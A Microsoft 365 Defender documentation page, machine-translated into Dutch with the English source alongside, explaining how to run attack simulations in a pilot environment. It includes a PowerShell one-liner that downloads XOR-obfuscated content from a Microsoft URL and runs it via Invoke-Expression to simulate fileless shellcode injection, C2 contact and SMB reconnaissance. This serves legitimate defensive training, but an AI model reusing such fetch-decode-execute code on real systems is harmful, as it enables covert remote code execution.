---
title: Een aanvalssimulatie uitvoeren in Microsoft 365 Defender testomgeving, geïsoleerde omgeving voor aanvalssimulatie, reactie, herstel
description: Voer aanvalssimulaties Microsoft 365 Defender om te zien hoe waarschuwingen en incidenten worden gepresenteerd, inzichten worden verkregen en bedreigingen snel worden opgelost.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
ms.date: 07/09/2021
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: ebea0a8eeed737712c55eb80b9ce3c68e06853c1
ms.sourcegitcommit: 718759c7146062841f7eb4a0a9a8bdddce0139b0
ms.translationtype: MT
ms.contentlocale: nl-NL
ms.lasthandoff: 07/15/2021
ms.locfileid: "53457826"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a><span data-ttu-id="0e43b-103">Een aanvalssimulatie uitvoeren in een Microsoft 365 Defender testomgeving</span><span class="sxs-lookup"><span data-stu-id="0e43b-103">Run an attack simulation in a Microsoft 365 Defender pilot environment</span></span>


<span data-ttu-id="0e43b-104">Dit artikel is [stap 1 van 2](eval-defender-investigate-respond.md) in het proces van het uitvoeren van een onderzoek en de reactie van een incident in Microsoft 365 Defender met behulp van een testomgeving.</span><span class="sxs-lookup"><span data-stu-id="0e43b-104">This article is [Step 1 of 2](eval-defender-investigate-respond.md) in the process of performing an investigation and response of an incident in Microsoft 365 Defender using a pilot environment.</span></span> <span data-ttu-id="0e43b-105">Zie het [overzichtsartikel](eval-defender-investigate-respond.md) voor meer informatie over dit proces.</span><span class="sxs-lookup"><span data-stu-id="0e43b-105">For more information about this process, see the [overview](eval-defender-investigate-respond.md) article.</span></span>

<span data-ttu-id="0e43b-106">Nadat u de testomgeving hebt [voorbereid,](eval-defender-investigate-respond.md)is het tijd om de incidentrespons en de geautomatiseerde onderzoeks- en herstelmogelijkheden van Microsoft 365 Defender te testen door een incident te maken met een gesimuleerde aanval en de Microsoft 365 Defender-portal te gebruiken om te onderzoeken en te reageren.</span><span class="sxs-lookup"><span data-stu-id="0e43b-106">After preparing your [pilot environment](eval-defender-investigate-respond.md), it's time to test Microsoft 365 Defender's incident response and automated investigation and remediation capabilities by creating an incident with a simulated attack and using the Microsoft 365 Defender portal to investigate and respond.</span></span>

<span data-ttu-id="0e43b-107">Een incident in Microsoft 365 Defender is een verzameling van gecorreleerde waarschuwingen en bijbehorende gegevens die het verhaal van een aanval bevatten.</span><span class="sxs-lookup"><span data-stu-id="0e43b-107">An incident in Microsoft 365 Defender is a collection of correlated alerts and associated data that make up the story of an attack.</span></span>

<span data-ttu-id="0e43b-108">Microsoft 365 services en apps maken waarschuwingen wanneer ze een verdachte of schadelijke gebeurtenis of activiteit detecteren.</span><span class="sxs-lookup"><span data-stu-id="0e43b-108">Microsoft 365 services and apps create alerts when they detect a suspicious or malicious event or activity.</span></span> <span data-ttu-id="0e43b-109">Afzonderlijke waarschuwingen geven waardevolle aanwijzingen over een voltooide of lopende aanval.</span><span class="sxs-lookup"><span data-stu-id="0e43b-109">Individual alerts provide valuable clues about a completed or ongoing attack.</span></span> <span data-ttu-id="0e43b-110">Aanvallen gebruiken echter meestal verschillende technieken voor verschillende typen entiteiten, zoals apparaten, gebruikers en postvakken.</span><span class="sxs-lookup"><span data-stu-id="0e43b-110">However, attacks typically employ various techniques against different types of entities, such as devices, users, and mailboxes.</span></span> <span data-ttu-id="0e43b-111">Het resultaat is meerdere waarschuwingen voor meerdere entiteiten in uw tenant.</span><span class="sxs-lookup"><span data-stu-id="0e43b-111">The result is multiple alerts for multiple entities in your tenant.</span></span>

>[!Note]
><span data-ttu-id="0e43b-112">Als u nog niet bekend bent met beveiligingsanalyse en incidentrespons, bekijkt u de [walkthrough](first-incident-overview.md) Reageren op uw eerste incident om een rondleiding te krijgen over een typisch proces van analyse, herstel en beoordeling na incidenten.</span><span class="sxs-lookup"><span data-stu-id="0e43b-112">If you are brand new to security analysis and incident response, see the [Respond to your first incident walkthrough](first-incident-overview.md) to get a guided tour of a typical process of analysis, remediation, and post-incident review.</span></span>
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a><span data-ttu-id="0e43b-113">Aanvallen simuleren met de Microsoft 365 Defender portal</span><span class="sxs-lookup"><span data-stu-id="0e43b-113">Simulate attacks with the Microsoft 365 Defender portal</span></span>

<span data-ttu-id="0e43b-114">De Microsoft 365 Defender portal heeft ingebouwde mogelijkheden om gesimuleerde aanvallen op uw testomgeving te maken:</span><span class="sxs-lookup"><span data-stu-id="0e43b-114">The Microsoft 365 Defender portal has built-in capabilities to create simulated attacks on your pilot environment:</span></span>

- <span data-ttu-id="0e43b-115">Attack simulation training for Microsoft 365 Defender for Office 365 at [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator) .</span><span class="sxs-lookup"><span data-stu-id="0e43b-115">Attack simulation training for Microsoft 365 Defender for Office 365 at [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).</span></span>
  
  <span data-ttu-id="0e43b-116">Selecteer in Microsoft 365 Defender portal **E-mail & samenwerking > Training voor de aanvalssimulatie**.</span><span class="sxs-lookup"><span data-stu-id="0e43b-116">In the Microsoft 365 Defender portal, select **Email & collaboration > Attack simulation training**.</span></span>

- <span data-ttu-id="0e43b-117">Zelfstudies voor aanvallen & voor Microsoft 365 Defender eindpunten op [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations) .</span><span class="sxs-lookup"><span data-stu-id="0e43b-117">Attack tutorials & simulations for Microsoft 365 Defender for Endpoints at [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).</span></span>

  <span data-ttu-id="0e43b-118">Selecteer in Microsoft 365 Defender portal Eindpunten > **zelfstudies & simulaties.**</span><span class="sxs-lookup"><span data-stu-id="0e43b-118">In the Microsoft 365 Defender portal, select **Endpoints > Tutorials & simulations**.</span></span>

### <a name="defender-for-office-365-attack-simulation-training"></a><span data-ttu-id="0e43b-119">Defender voor Office 365 Training voor aanvalssimulatie</span><span class="sxs-lookup"><span data-stu-id="0e43b-119">Defender for Office 365 Attack simulation training</span></span>

<span data-ttu-id="0e43b-120">Defender for Office 365 with Microsoft 365 E5 or Microsoft Defender for Office 365 Plan 2 includes attack simulation training for phishing attacks.</span><span class="sxs-lookup"><span data-stu-id="0e43b-120">Defender for Office 365 with Microsoft 365 E5 or Microsoft Defender for Office 365 Plan 2 includes attack simulation training for phishing attacks.</span></span> <span data-ttu-id="0e43b-121">De basisstappen zijn:</span><span class="sxs-lookup"><span data-stu-id="0e43b-121">The basic steps are:</span></span>

1. <span data-ttu-id="0e43b-122">Een simulatie maken</span><span class="sxs-lookup"><span data-stu-id="0e43b-122">Create a simulation</span></span>

   <span data-ttu-id="0e43b-123">Zie Een phishing-aanval simuleren voor stapsgewijs instructies over het maken en verzenden van een nieuwe [simulatie.](/microsoft-365/security/office-365-security/attack-simulation-training)</span><span class="sxs-lookup"><span data-stu-id="0e43b-123">For step by step instructions on how to create and send a new simulation, see [Simulate a phishing attack](/microsoft-365/security/office-365-security/attack-simulation-training).</span></span>

2. <span data-ttu-id="0e43b-124">Een payload maken</span><span class="sxs-lookup"><span data-stu-id="0e43b-124">Create a payload</span></span>

   <span data-ttu-id="0e43b-125">Zie Een aangepaste payload maken voor de trainingstraining aanvalssimulatie voor stapsgewijs instructies over het maken van een payload voor gebruik in [een simulatie.](/microsoft-365/security/office-365-security/attack-simulation-training-payloads)</span><span class="sxs-lookup"><span data-stu-id="0e43b-125">For step by step instructions on how to create a payload for use within a simulation, see [Create a custom payload for Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).</span></span>

3. <span data-ttu-id="0e43b-126">Inzichten verkrijgen</span><span class="sxs-lookup"><span data-stu-id="0e43b-126">Gaining insights</span></span>

   <span data-ttu-id="0e43b-127">Zie Inzichten verkrijgen via de trainingstraining Aanvalssimulatie voor [stapsgewijs](/microsoft-365/security/office-365-security/attack-simulation-training-insights)instructies over het verkrijgen van inzichten met rapportage.</span><span class="sxs-lookup"><span data-stu-id="0e43b-127">For step by step instructions on how to gain insights with reporting, see [Gain insights through Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-insights).</span></span>

<span data-ttu-id="0e43b-128">Zie Simulaties voor [meer informatie.](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations)</span><span class="sxs-lookup"><span data-stu-id="0e43b-128">For more information, see [Simulations](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).</span></span>

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a><span data-ttu-id="0e43b-129">Defender for Endpoint attack tutorials & simulations</span><span class="sxs-lookup"><span data-stu-id="0e43b-129">Defender for Endpoint attack tutorials & simulations</span></span>

<span data-ttu-id="0e43b-130">Hier zijn de Defender voor eindpuntsimulaties van Microsoft:</span><span class="sxs-lookup"><span data-stu-id="0e43b-130">Here are the Defender for Endpoint simulations from Microsoft:</span></span>

- <span data-ttu-id="0e43b-131">Backdoor van document valt</span><span class="sxs-lookup"><span data-stu-id="0e43b-131">Document drops backdoor</span></span>
- <span data-ttu-id="0e43b-132">Geautomatiseerd onderzoek (backdoor)</span><span class="sxs-lookup"><span data-stu-id="0e43b-132">Automated investigation (backdoor)</span></span>

<span data-ttu-id="0e43b-133">Er zijn extra simulaties van Attack IQ en SafeBreach.</span><span class="sxs-lookup"><span data-stu-id="0e43b-133">There are additional simulations from Attack IQ and SafeBreach.</span></span> <span data-ttu-id="0e43b-134">Er zijn ook een reeks zelfstudies.</span><span class="sxs-lookup"><span data-stu-id="0e43b-134">There are also a set of tutorials.</span></span>

<span data-ttu-id="0e43b-135">Voor elke simulatie of zelfstudie:</span><span class="sxs-lookup"><span data-stu-id="0e43b-135">For each simulation or tutorial:</span></span>

1. <span data-ttu-id="0e43b-136">Download en lees het bijbehorende doorloopdocument dat bij de geselecteerde simulatie of het geselecteerde scenario is geleverd.</span><span class="sxs-lookup"><span data-stu-id="0e43b-136">Download and read the corresponding walk through document provided with your selected simulation or scenario.</span></span>

2. <span data-ttu-id="0e43b-137">Download het simulatiebestand.</span><span class="sxs-lookup"><span data-stu-id="0e43b-137">Download the simulation file.</span></span> <span data-ttu-id="0e43b-138">U kunt ervoor kiezen om het bestand of script te downloaden op het testapparaat, maar dit is niet verplicht.</span><span class="sxs-lookup"><span data-stu-id="0e43b-138">You can choose to download the file or script on the test device but it's not mandatory.</span></span>

3. <span data-ttu-id="0e43b-139">Voer het simulatiebestand of script uit op het testapparaat, zoals wordt geïnstrueerd in het doorloopdocument.</span><span class="sxs-lookup"><span data-stu-id="0e43b-139">Run the simulation file or script on the test device as instructed in the walk through document.</span></span>

 <span data-ttu-id="0e43b-140">Zie Experience [Microsoft Defender for Endpoint through simulated attack (Microsoft Defender for Endpoint through simulated attack) voor meer informatie.](/microsoft-365/security/defender-endpoint/attack-simulations)</span><span class="sxs-lookup"><span data-stu-id="0e43b-140">For more information, see [Experience Microsoft Defender for Endpoint through simulated attack](/microsoft-365/security/defender-endpoint/attack-simulations).</span></span>

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a><span data-ttu-id="0e43b-141">Een aanval simuleren met een geïsoleerd domeincontroller en clientapparaat (optioneel)</span><span class="sxs-lookup"><span data-stu-id="0e43b-141">Simulate an attack with an isolated domain controller and client device (optional)</span></span>

<span data-ttu-id="0e43b-142">In deze optionele incidentresponsoefening simuleert u een aanval op een geïsoleerde AD DS-domeincontroller (Active Directory Domain Services) en Windows 10-apparaat met behulp van een PowerShell-script en onderzoekt, herstelt en lost u het incident op.</span><span class="sxs-lookup"><span data-stu-id="0e43b-142">In this optional incident response exercise, you'll simulate an attack on an isolated Active Directory Domain Services (AD DS) domain controller and Windows 10 device using a PowerShell script and then investigate, remediate, and resolve the incident.</span></span>

<span data-ttu-id="0e43b-143">Eerst moet u eindpunten toevoegen aan uw testomgeving.</span><span class="sxs-lookup"><span data-stu-id="0e43b-143">First, you need to add endpoints to your pilot environment.</span></span>

### <a name="add-pilot-environment-endpoints"></a><span data-ttu-id="0e43b-144">Testomgeving-eindpunten toevoegen</span><span class="sxs-lookup"><span data-stu-id="0e43b-144">Add pilot environment endpoints</span></span>

<span data-ttu-id="0e43b-145">Eerst moet u een geïsoleerde AD DS-domeincontroller en een Windows 10 toevoegen aan uw testomgeving.</span><span class="sxs-lookup"><span data-stu-id="0e43b-145">First, you need to add an isolated AD DS domain controller and a Windows 10 device to your pilot environment.</span></span>

1. <span data-ttu-id="0e43b-146">Controleer of de tenant voor de testomgeving [de](m365d-enable.md#confirm-that-the-service-is-on)Microsoft 365 Defender.</span><span class="sxs-lookup"><span data-stu-id="0e43b-146">Verify your pilot environment tenant has [enabled Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span></span>

2. <span data-ttu-id="0e43b-147">Controleer of uw domeincontroller:</span><span class="sxs-lookup"><span data-stu-id="0e43b-147">Verify that your domain controller:</span></span>

   - <span data-ttu-id="0e43b-148">Wordt Windows Server 2008 R2 of een nieuwere versie uitgevoerd.</span><span class="sxs-lookup"><span data-stu-id="0e43b-148">Runs Windows Server 2008 R2 or a later version.</span></span>
   - <span data-ttu-id="0e43b-149">Rapporteert [aan Microsoft Defender voor identiteit en](/azure/security-center/security-center-wdatp) heeft extern beheer [ingeschakeld.](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)</span><span class="sxs-lookup"><span data-stu-id="0e43b-149">Reports to [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) and has enabled [remote management](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>
   - <span data-ttu-id="0e43b-150">Is [Microsoft Defender voor identiteit en Microsoft Cloud App Security ingeschakeld.](/cloud-app-security/mdi-integration)</span><span class="sxs-lookup"><span data-stu-id="0e43b-150">Has [Microsoft Defender for Identity and Microsoft Cloud App Security integration](/cloud-app-security/mdi-integration) enabled.</span></span>
   - <span data-ttu-id="0e43b-151">Heeft een testgebruiker is gemaakt in het testdomein.</span><span class="sxs-lookup"><span data-stu-id="0e43b-151">Has a test user is created in the test domain.</span></span> <span data-ttu-id="0e43b-152">Beheerdersmachtigingen zijn niet nodig.</span><span class="sxs-lookup"><span data-stu-id="0e43b-152">Administrator-level permissions are not needed.</span></span>

3. <span data-ttu-id="0e43b-153">Controleer of uw testapparaat:</span><span class="sxs-lookup"><span data-stu-id="0e43b-153">Verify that your test device:</span></span>

   - <span data-ttu-id="0e43b-154">Wordt Windows 10 versie 1903 of een latere versie uitgevoerd.</span><span class="sxs-lookup"><span data-stu-id="0e43b-154">Runs Windows 10 version 1903 or a later version.</span></span>
   - <span data-ttu-id="0e43b-155">Is verbonden met het domein van de AD DS-domeincontroller.</span><span class="sxs-lookup"><span data-stu-id="0e43b-155">Is joined to the AD DS domain controller domain.</span></span>
   - <span data-ttu-id="0e43b-156">Is [Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) ingeschakeld.</span><span class="sxs-lookup"><span data-stu-id="0e43b-156">Has [Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) enabled.</span></span> <span data-ttu-id="0e43b-157">Als u problemen hebt met het inschakelen van Windows Defender Antivirus, bekijkt u dit [probleemoplossingsonderwerp.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)</span><span class="sxs-lookup"><span data-stu-id="0e43b-157">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
   - <span data-ttu-id="0e43b-158">Is [onboarded to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="0e43b-158">Is [onboarded to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="0e43b-159">Als u tenant- en apparaatgroepen gebruikt, maakt u een speciale apparaatgroep voor het testapparaat en drukt u deze op het hoogste niveau.</span><span class="sxs-lookup"><span data-stu-id="0e43b-159">If you use tenant and device groups, create a dedicated device group for the test device and push it to top level.</span></span>

<span data-ttu-id="0e43b-160">Een alternatief is om uw AD DS-domeincontroller en testapparaat te hosten als virtuele machines in Microsoft Azure infrastructuurservices.</span><span class="sxs-lookup"><span data-stu-id="0e43b-160">One alternative is to host your AD DS domain controller and test device as virtual machines in Microsoft Azure infrastructure services.</span></span> <span data-ttu-id="0e43b-161">U kunt de instructies in [fase 1](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet)van de gesimuleerde testlaborator voor ondernemingen gebruiken, maar het maken van de virtuele APP1-machine overslaan.</span><span class="sxs-lookup"><span data-stu-id="0e43b-161">You can use the instructions in [Phase 1 of the simulated enterprise Test Lab Guide](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet), but skip the creation of the APP1 virtual machine.</span></span>

<span data-ttu-id="0e43b-162">Hier is het resultaat.</span><span class="sxs-lookup"><span data-stu-id="0e43b-162">Here is the result.</span></span>

![Eindpunten voor uw Defender-evaluatieomgeving met de gesimuleerde testlaborator voor ondernemingen](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png)

<span data-ttu-id="0e43b-164">U simuleert een geavanceerde aanval die gebruik maakt van geavanceerde technieken om te verbergen voor detectie.</span><span class="sxs-lookup"><span data-stu-id="0e43b-164">You'll simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="0e43b-165">Met de aanval worden geopende SMB-sessies (Server Message Block) op domeincontrollers opgeslagen en worden recente IP-adressen van apparaten van gebruikers opgehaald.</span><span class="sxs-lookup"><span data-stu-id="0e43b-165">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices.</span></span> <span data-ttu-id="0e43b-166">Deze categorie aanvallen bevat meestal geen bestanden die zijn gedropt op het apparaat van het slachtoffer en ze komen alleen in het geheugen voor.</span><span class="sxs-lookup"><span data-stu-id="0e43b-166">This category of attacks usually doesn't include files dropped on the victim's device and they occur solely in memory.</span></span> <span data-ttu-id="0e43b-167">Ze 'leven van het land' door bestaande systeem- en beheerhulpmiddelen te gebruiken en hun code in systeemprocessen te injecteren om hun uitvoering te verbergen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-167">They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution.</span></span> <span data-ttu-id="0e43b-168">Met dergelijke gedragingen kunnen ze detectie vermijden en blijven ze op het apparaat.</span><span class="sxs-lookup"><span data-stu-id="0e43b-168">Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="0e43b-169">In deze simulatie begint ons voorbeeldscenario met een PowerShell-script.</span><span class="sxs-lookup"><span data-stu-id="0e43b-169">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="0e43b-170">In de echte wereld kan een gebruiker worden misleid in het uitvoeren van een script of kan het script worden uitgevoerd vanaf een externe verbinding met een andere computer vanaf een eerder geïnfecteerd apparaat, wat aangeeft dat de aanvaller lateraal probeert te verplaatsen in het netwerk.</span><span class="sxs-lookup"><span data-stu-id="0e43b-170">In the real world, a user might be tricked into running a script or the script might run from a remote connection to another computer from a previously infected device, which indicates that the attacker is attempting to move laterally in the network.</span></span> <span data-ttu-id="0e43b-171">Detectie van deze scripts kan lastig zijn omdat beheerders ook vaak scripts op afstand uitvoeren om verschillende beheeractiviteiten uit te voeren.</span><span class="sxs-lookup"><span data-stu-id="0e43b-171">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Fileless PowerShell attack with process injection and SMB reconnaisance attack diagram](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="0e43b-173">Tijdens de simulatie injecteert de aanval shellcode in een schijnbaar onschuldig proces.</span><span class="sxs-lookup"><span data-stu-id="0e43b-173">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="0e43b-174">Voor het scenario is het gebruik van notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="0e43b-174">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="0e43b-175">We hebben dit proces gekozen voor de simulatie, maar aanvallers zouden zich waarschijnlijk richten op een langlopende systeemprocedure, zoals svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="0e43b-175">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="0e43b-176">De shellcode gaat vervolgens verder met het contact opnemen met de C2-server (Command-and-Control) van de aanvaller om instructies te ontvangen over hoe u verder kunt gaan.</span><span class="sxs-lookup"><span data-stu-id="0e43b-176">The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="0e43b-177">Met het script wordt geprobeerd verkenningsquery's uit te voeren op de domeincontroller (DC).</span><span class="sxs-lookup"><span data-stu-id="0e43b-177">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="0e43b-178">Met Verkenning kan een aanvaller informatie krijgen over recente aanmeldingsgegevens van gebruikers.</span><span class="sxs-lookup"><span data-stu-id="0e43b-178">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="0e43b-179">Zodra aanvallers deze informatie hebben, kunnen ze lateraal in het netwerk naar een specifiek gevoelig account gaan</span><span class="sxs-lookup"><span data-stu-id="0e43b-179">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

> [!IMPORTANT]
> <span data-ttu-id="0e43b-180">Voor optimale resultaten volgt u de instructies voor de aanvalssimulatie zo goed mogelijk.</span><span class="sxs-lookup"><span data-stu-id="0e43b-180">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a><span data-ttu-id="0e43b-181">De geïsoleerde AD DS-domeincontroller-aanvalssimulatie uitvoeren</span><span class="sxs-lookup"><span data-stu-id="0e43b-181">Run the isolated AD DS domain controller attack simulation</span></span>

<span data-ttu-id="0e43b-182">De scenariosimulatie van het aanvalsscenario uitvoeren:</span><span class="sxs-lookup"><span data-stu-id="0e43b-182">To run the attack scenario simulation:</span></span>

1. <span data-ttu-id="0e43b-183">Zorg ervoor dat uw testomgeving de geïsoleerde AD DS-domeincontroller en het Windows 10 bevat.</span><span class="sxs-lookup"><span data-stu-id="0e43b-183">Ensure that your pilot environment includes the isolated AD DS domain controller and Windows 10 device.</span></span>

2. <span data-ttu-id="0e43b-184">Meld u aan bij het testapparaat met het testgebruikersaccount.</span><span class="sxs-lookup"><span data-stu-id="0e43b-184">Sign in to the test device with the test user account.</span></span>

3. <span data-ttu-id="0e43b-185">Open een Windows PowerShell op het testapparaat.</span><span class="sxs-lookup"><span data-stu-id="0e43b-185">Open a Windows PowerShell window on the test device.</span></span>

4. <span data-ttu-id="0e43b-186">Kopieer het volgende simulatiescript:</span><span class="sxs-lookup"><span data-stu-id="0e43b-186">Copy the following simulation script:</span></span>

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > <span data-ttu-id="0e43b-187">Als u dit artikel opent in een webbrowser, kunt u problemen ondervinden bij het kopiëren van de volledige tekst zonder bepaalde tekens te verliezen of extra regel-onderbrekingen te introduceren.</span><span class="sxs-lookup"><span data-stu-id="0e43b-187">If you open this article on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="0e43b-188">Als dit het geval is, downloadt u dit document en opent u het op Adobe Reader.</span><span class="sxs-lookup"><span data-stu-id="0e43b-188">If this is the case, download this document and open it on Adobe Reader.</span></span>

5. <span data-ttu-id="0e43b-189">Plak en voer het gekopieerde script uit in het PowerShell-venster.</span><span class="sxs-lookup"><span data-stu-id="0e43b-189">Paste and run the copied script in the PowerShell window.</span></span>

> [!NOTE]
> <span data-ttu-id="0e43b-190">Als u PowerShell gebruikt met RDP (Remote Desktop Protocol), gebruikt u de opdracht Klembordtekst typen in de RDP-client omdat de sneltoets **Ctrl-V** of de methode voor het plakken met de rechtermuisknop mogelijk niet werkt.</span><span class="sxs-lookup"><span data-stu-id="0e43b-190">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span> <span data-ttu-id="0e43b-191">Recente versies van PowerShell accepteren deze methode soms ook niet, mogelijk moet u eerst kopiëren naar Kladblok in het geheugen, deze kopiëren in de virtuele machine en deze vervolgens in PowerShell plakken.</span><span class="sxs-lookup"><span data-stu-id="0e43b-191">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="0e43b-192">Een paar seconden later wordt Kladblok app geopend.</span><span class="sxs-lookup"><span data-stu-id="0e43b-192">A few seconds later, the Notepad app will open.</span></span> <span data-ttu-id="0e43b-193">Er wordt een gesimuleerde aanvalscode in de Kladblok.</span><span class="sxs-lookup"><span data-stu-id="0e43b-193">A simulated attack code will be injected into Notepad.</span></span> <span data-ttu-id="0e43b-194">Houd het automatisch gegenereerde Kladblok geopend om het volledige scenario te kunnen ervaren.</span><span class="sxs-lookup"><span data-stu-id="0e43b-194">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="0e43b-195">De gesimuleerde aanvalscode probeert te communiceren met een extern IP-adres (de C2-server simuleren) en probeert vervolgens via SMB een verkenningspoging te doen tegen de domeincontroller.</span><span class="sxs-lookup"><span data-stu-id="0e43b-195">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="0e43b-196">Dit bericht wordt weergegeven op de PowerShell-console wanneer dit script is voltooid:</span><span class="sxs-lookup"><span data-stu-id="0e43b-196">You'll see this message displayed on the PowerShell console when this script completes:</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

<span data-ttu-id="0e43b-197">Als u de functie Automatisch incident en antwoord in actie wilt zien, houdt u het notepad.exe geopend.</span><span class="sxs-lookup"><span data-stu-id="0e43b-197">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="0e43b-198">U ziet Automatisch incident en antwoord stoppen met het Kladblok proces.</span><span class="sxs-lookup"><span data-stu-id="0e43b-198">You'll see Automated Incident and Response stop the Notepad process.</span></span>

### <a name="investigate-the-incident-for-the-simulated-attack"></a><span data-ttu-id="0e43b-199">Het incident voor de gesimuleerde aanval onderzoeken</span><span class="sxs-lookup"><span data-stu-id="0e43b-199">Investigate the incident for the simulated attack</span></span>

> [!NOTE]
> <span data-ttu-id="0e43b-200">Voordat we u door deze simulatie leiden, bekijkt u de volgende video om te zien hoe incidentbeheer u helpt de gerelateerde waarschuwingen samen te delen als onderdeel van het onderzoeksproces, waar u deze kunt vinden in de portal en hoe het u kan helpen bij uw beveiligingsbewerkingen:</span><span class="sxs-lookup"><span data-stu-id="0e43b-200">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="0e43b-201">Als u overschakelt naar het standpunt van de SOC-analist, kunt u nu beginnen met het onderzoeken van de aanval in de Microsoft 365 Defender portal.</span><span class="sxs-lookup"><span data-stu-id="0e43b-201">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Defender portal.</span></span>

1. <span data-ttu-id="0e43b-202">Open de [Microsoft 365 Defender portal](https://security.microsoft.com/).</span><span class="sxs-lookup"><span data-stu-id="0e43b-202">Open the [Microsoft 365 Defender portal](https://security.microsoft.com/).</span></span>

2. <span data-ttu-id="0e43b-203">Selecteer in het navigatiedeelvenster de optie **Incidenten & waarschuwingen > incidenten.**</span><span class="sxs-lookup"><span data-stu-id="0e43b-203">From the navigation pane, select **Incidents & Alerts > Incidents**.</span></span>

3. <span data-ttu-id="0e43b-204">Het nieuwe incident voor de gesimuleerde aanval wordt weergegeven in de incidentwachtrij.</span><span class="sxs-lookup"><span data-stu-id="0e43b-204">The new incident for the simulated attack will appear in the incident queue.</span></span>

    ![Voorbeeld van de incidentwachtrij](../../media/mtp/fig2.png)

#### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="0e43b-206">De aanval als één incident onderzoeken</span><span class="sxs-lookup"><span data-stu-id="0e43b-206">Investigate the attack as a single incident</span></span>

